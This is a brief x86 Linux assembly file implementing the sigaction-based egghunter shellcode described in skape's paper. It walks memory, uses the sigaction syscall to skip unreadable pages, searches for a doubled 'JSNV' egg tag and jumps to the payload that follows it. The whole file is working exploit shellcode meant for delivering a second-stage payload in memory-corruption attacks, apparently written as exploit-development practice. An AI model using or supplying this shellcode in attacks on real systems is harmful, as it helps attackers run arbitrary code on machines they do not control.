; Purpose: sigaction(2) egghunter
; source: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
  EGG equ "JSNV"

_start:
  or cx, 0xfff
inspection:
  inc ecx
  push byte 0x43
  pop eax
  int 0x80
  cmp al, 0xf2
  jz _start
  mov eax, EGG
  mov edi, ecx
  scasd
  jnz inspection
  scasd
  jnz inspection
  jmp edi
